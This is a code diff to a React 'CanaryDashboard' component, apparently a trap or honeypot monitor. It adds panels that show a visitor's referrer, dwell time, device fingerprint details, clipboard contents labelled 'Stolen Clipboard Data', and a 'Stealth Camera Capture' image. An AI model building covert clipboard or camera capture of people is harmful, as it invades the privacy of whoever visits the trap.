@@ -605,6 +605,48 @@ export default function CanaryDashboard() {
                                 </div>
                               </div>
                             </div>
+
+                            {/* Aggressive Telemetry Row 1 */}
+                            <div className="mt-3 grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+                              {alert.referrer && (
+                                <div className="bg-neutral-900/60 rounded-xl p-3 border border-indigo-500/20 shadow-inner flex flex-col gap-1">
+                                  <p className="text-[9px] text-indigo-400 font-bold uppercase tracking-wider">Arrived From (Referrer)</p>
+                                  <p className="text-xs font-mono text-indigo-200 break-words line-clamp-2">{alert.referrer}</p>
+                                </div>
+                              )}
+                              {alert.dwell_time_ms !== undefined && (
+                                <div className="bg-neutral-900/60 rounded-xl p-3 border border-fuchsia-500/20 shadow-inner flex flex-col gap-1">
+                                  <p className="text-[9px] text-fuchsia-400 font-bold uppercase tracking-wider">Time Spent Looking At Trap</p>
+                                  <p className="text-sm font-mono text-fuchsia-200 font-bold">{(alert.dwell_time_ms / 1000).toFixed(1)} seconds</p>
+                                </div>
+                              )}
+                            </div>
+
+                            {/* Aggressive Telemetry Row 2 */}
+                            {(alert.clipboard_text || alert.camera_image) && (
+                              <div className="mt-3 grid grid-cols-1 md:grid-cols-2 gap-3 sm:gap-4">
+                                {alert.clipboard_text && (
+                                  <div className="bg-rose-900/20 rounded-xl p-3 border border-rose-500/30 shadow-inner flex flex-col gap-2">
+                                    <p className="text-[10px] text-rose-400 font-bold uppercase tracking-wider flex items-center gap-2">
+                                      <span className="w-1.5 h-1.5 rounded-full bg-rose-500 animate-pulse"></span>
+                                      Stolen Clipboard Data
+                                    </p>
+                                    <code className="text-rose-200 bg-black/50 p-2 rounded block font-mono text-xs break-words max-h-32 overflow-y-auto">
+                                      {alert.clipboard_text}
+                                    </code>
+                                  </div>
+                                )}
+                                {alert.camera_image && (
+                                  <div className="bg-emerald-900/20 rounded-xl p-3 border border-emerald-500/30 shadow-inner flex flex-col gap-2">
+                                    <p className="text-[10px] text-emerald-400 font-bold uppercase tracking-wider flex items-center gap-2">
+                                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
+                                      Stealth Camera Capture
+                                    </p>
+                                    <img src={alert.camera_image} alt="Intruder capture" className="rounded border border-emerald-500/50 w-full object-contain max-h-48 bg-black/50" />
+                                  </div>
+                                )}
+                              </div>
+                            )}
                             
                             {(alert.screen_resolution || alert.hardware_concurrency || alert.language) && (
                               <div className="mt-3 bg-neutral-900/40 rounded-xl p-3 border border-white/5 shadow-inner">
@@ -615,6 +657,15 @@ export default function CanaryDashboard() {
                                 <div className="flex flex-wrap gap-2 sm:gap-4 text-[10px] sm:text-xs">
                                   {alert.screen_resolution && (
                                     <div className="bg-black/30 px-2 py-1 rounded border border-white/5"><span className="text-neutral-500">Screen:</span> <span className="font-mono text-emerald-200">{alert.screen_resolution}</span></div>
+                                  )}
+                                  {alert.color_depth && (
+                                    <div className="bg-black/30 px-2 py-1 rounded border border-white/5"><span className="text-neutral-500">Color Depth:</span> <span className="font-mono text-emerald-200">{alert.color_depth}-bit</span></div>
+                                  )}
+                                  {alert.dark_mode !== undefined && (
+                                    <div className="bg-black/30 px-2 py-1 rounded border border-white/5"><span className="text-neutral-500">Theme:</span> <span className="font-mono text-emerald-200">{alert.dark_mode ? 'Dark Mode' : 'Light Mode'}</span></div>
+                                  )}
+                                  {alert.device_posture && (
+                                    <div className="bg-black/30 px-2 py-1 rounded border border-emerald-500/20"><span className="text-emerald-500/70">Posture:</span> <span className="font-mono text-emerald-300 font-bold">{alert.device_posture}</span></div>
                                   )}
                                   {alert.os_platform && (
                                     <div className="bg-black/30 px-2 py-1 rounded border border-white/5"><span className="text-neutral-500">OS:</span> <span className="font-mono text-emerald-200">{alert.os_platform}</span></div>
